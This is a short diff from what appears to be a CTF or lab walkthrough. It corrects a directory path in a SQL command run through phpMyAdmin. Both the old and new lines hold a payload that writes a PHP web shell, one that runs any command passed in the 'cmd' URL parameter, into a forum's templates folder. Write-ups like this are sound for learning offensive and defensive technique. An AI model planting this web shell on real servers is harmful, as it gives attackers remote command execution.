@@ -172,7 +172,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 we just have to add a file in template_c with :
 ```sh
-SELECT "<?php system($_GET['cmd']) ?>" into outfile "/var/www/forum/template_c/cmd.php"
+SELECT "<?php system($_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/cmd.php"
 ```
 in the php my admin sql execution
 
